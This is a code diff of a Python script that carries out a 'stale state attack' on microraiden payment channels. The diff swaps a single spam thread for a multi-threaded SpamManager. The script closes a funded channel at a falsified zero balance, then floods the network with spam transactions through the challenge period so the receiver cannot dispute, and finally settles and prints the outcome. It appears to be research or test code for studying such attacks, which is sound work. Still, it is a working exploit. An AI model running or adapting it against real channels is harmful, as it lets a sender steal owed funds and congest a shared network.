@@ -1,90 +1,23 @@
+#!/usr/bin/python
+
 import sys, os
 sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '../..'))
 
 from microraiden import Client
-from microraiden.utils import privkey_to_addr
 from utils import (
     send_payment,
     create_close_channel_transaction,
     create_settle_channel_transaction,
-    create_spam_transactions,
-    wait_for_blocks,
     wait_for_open,
     wait_for_close,
     wait_for_settle,
 )
 import config as config
 from web3 import Web3, HTTPProvider
-from threading import Thread, currentThread
-import logging, click, json, time, datetime
+from spamming import SpamManager
+import logging, click, datetime
 
-def spammer(web3, private_key: str = config.PRIVATE_KEY, nonce_offset: int = 0, target_block: int = 0, batch_size: int = config.SPAM_BATCH_SIZE, min_pending_txs: int = config.MIN_PENDING_TXS, callback = None):
-    thread_log = logging.getLogger('spammer')
-
-    t = currentThread()
-
-    account_address = privkey_to_addr(private_key)
-    first_nonce = web3.eth.getTransactionCount(account_address, 'pending') + nonce_offset
-    sent_txs = 0
-    current_block = web3.eth.blockNumber
-
-    while getattr(t, 'do_run', True) & (current_block < target_block):
-        # Create signed spam transactions
-        spam_txs = create_spam_transactions(
-            private_key=private_key,
-            web3=web3,
-            account_address=account_address,
-            number=batch_size,
-            min_nonce=first_nonce+sent_txs,
-        )
-
-        # Send spam transactions
-        thread_log.debug('Sending {} spam transactions...'.format(len(spam_txs)))
-        for tx in spam_txs:
-            web3.eth.sendRawTransaction(tx)
-            sent_txs += 1
-        
-        thread_log.info('Sent transactions = {}'.format(sent_txs))
-
-        # Update target block
-        target_block = getattr(t, 'target_block', target_block)
-        while getattr(t, 'do_run', True) & (web3.eth.getTransactionCount(account_address, 'pending') < (first_nonce + sent_txs - min_pending_txs)) & (web3.eth.blockNumber < target_block):
-            time.sleep(1)
-
-        current_block = web3.eth.blockNumber
-        thread_log.debug('Pending transactions = {}'.format((first_nonce + sent_txs) - web3.eth.getTransactionCount(account_address, 'pending')))
-        thread_log.info('Current block = {} / Target block = {} (remaining blocks = {})'.format(current_block, target_block, target_block - current_block))
-        
-    if getattr(t, 'do_run', True) & (callback is not None):
-        callback(first_nonce+sent_txs)
-
-# def spammer2(web3, private_key: str = config.PRIVATE_KEY, number_txs: int = config.NUMBER_SPAM_TX, batch_size: int = config.SPAM_BATCH_SIZE, callback = None):
-#     thread_log = logging.getLogger('spammer')
-
-#     t = currentThread()
-#     sent_txs = 0
-    
-#     account_address = privkey_to_addr(private_key)
-#     first_nonce = web3.eth.getTransactionCount(account_address, 'pending')
-
-#     while getattr(t, 'do_run', True) & (sent_txs < number_txs):
-#         number = batch_size
-#         if (number_txs - sent_txs) < batch_size:
-#             number = number_txs - sent_txs
-        
-#         spam_txs = create_spam_transactions(private_key=private_key, web3=web3, account_address=account_address, number=number, min_nonce=first_nonce+sent_txs)
-#         thread_log.debug('Sending {} spam transactions...'.format(len(spam_txs)))
-        
-#         for tx in spam_txs:
-#             web3.eth.sendRawTransaction(tx)
-        
-#         sent_txs += len(spam_txs)
-#         thread_log.info('Sent transactions = {}'.format(sent_txs))
-    
-#     if callback is not None:
-#         callback()
-
-def cheat_and_spam(channel, private_key: str = config.PRIVATE_KEY, challenge_period: int = config.CHALLENGE_PERIOD, batch_size: int = config.SPAM_BATCH_SIZE):
+def cheat_and_spam(channel, private_key: str = config.PRIVATE_KEY, challenge_period: int = config.CHALLENGE_PERIOD):
     '''
     Performs a stale state attack on the given channel. 
     Assumes that the given channel's balance is > 0. Closes the channel with balance 0 
@@ -94,31 +27,35 @@ def cheat_and_spam(channel, private_key: str = config.PRIVATE_KEY, challenge_per
     # Create close channel transaction
     close_tx = create_close_channel_transaction(channel=channel, balance=0)
 
-    # Create given number of signed spam transactions
-    # spam_txs = create_spam_transactions(private_key=private_key, web3=channel.core.web3, account_address=privkey_to_addr(private_key), nonce_offset=1, number=batch_size)
-
     # Send close channel transaction    
     logging.info('Sending close transaction...')
     channel.core.web3.eth.sendRawTransaction(close_tx)
 
-    # Start transaction spamming in a thread
-    logging.info('Starting network spamming for {} blocks...'.format(challenge_period))
-    spam_thread = Thread(target=spammer, args=(channel.core.web3, private_key, 1, channel.core.web3.eth.blockNumber+challenge_period, batch_size, config.MIN_PENDING_TXS, lambda nonce: send_settle(channel, nonce),))
-    spam_thread.start()
+    # Start transaction spamming
+    spam_manager = SpamManager(
+        web3=channel.core.web3,
+        private_key=config.PRIVATE_KEY,
+        number_threads=8,
+        nonce_offset=1,
+        min_pending_txs=config.MIN_PENDING_TXS,
+        callback=lambda nonce: send_settle(channel, nonce),
+    )
+    spam_manager.start()
+
 
     # Wait for channel to be closed
     closed_event = wait_for_close(channel)
     logging.info('Channel closed at block #{}'.format(closed_event['blockNumber']))
 
     # Update target block for spamming thread
-    spam_thread.target_block = closed_event['blockNumber'] + challenge_period
+    target_block = closed_event['blockNumber'] + challenge_period
+    spam_manager.update_target_block(target_block)
     
     # Wait for channel to be settled
     settled_event = wait_for_settle(channel)
     logging.info('Channel settled at block #{}'.format(settled_event['blockNumber']))
 
-    spam_thread.do_run = False
-    spam_thread.join()
+    spam_manager.stop()
 
     settle_tx_hash = settled_event['transactionHash']
     settle_tx = channel.core.web3.eth.getTransaction(settle_tx_hash)
@@ -138,9 +75,9 @@ def cheat_and_spam(channel, private_key: str = config.PRIVATE_KEY, challenge_per
     print('-----------------------------------------------------------')
     print('Sender \t\t {}'.format(channel.core.address))
     print('Receiver \t {}'.format(channel.receiver))
-    print('OPENED block \t #{}'.format(channel.block))
-    print('CLOSED block \t #{}'.format(closed_event['blockNumber']))
-    print('SETTLED block \t #{}'.format(settled_event['blockNumber']))
+    # print('OPENED block \t #{}'.format(channel.block))
+    # print('CLOSED block \t #{}'.format(closed_event['blockNumber']))
+    # print('SETTLED block \t #{}'.format(settled_event['blockNumber']))
     print()
     # print('Spam transactions \t {}'.format(number_txs))
     print('Settled by \t {}'.format(settled_by))
@@ -182,7 +119,7 @@ def main(rpcport: int):
     send_payment(channel=channel, amount=amount)
 
     # Start stale state attack
-    cheat_and_spam(channel=channel, private_key=config.PRIVATE_KEY, challenge_period=config.CHALLENGE_PERIOD, batch_size=config.SPAM_BATCH_SIZE)
+    cheat_and_spam(channel=channel, private_key=config.PRIVATE_KEY, challenge_period=config.CHALLENGE_PERIOD)
 
 if __name__ == '__main__':
     logging.basicConfig(level=logging.INFO)
